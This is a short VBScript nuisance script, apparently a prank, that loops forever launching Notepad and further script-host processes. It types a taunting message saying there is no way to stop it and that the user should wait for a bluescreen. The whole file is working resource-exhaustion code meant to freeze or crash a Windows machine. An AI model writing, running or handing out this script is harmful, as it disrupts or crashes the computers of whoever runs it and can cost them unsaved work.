Set objShell = WScript.CreateObject("WScript.Shell")
do
objShell.Run "notepad.exe", MAXIMIZE_WINDOW
objShell.Run "wscript.exe", MAXIMIZE_WINDOW
objShell.SendKeys "Sorry there's no way to stop this. Just wait for bluescreen :["
loop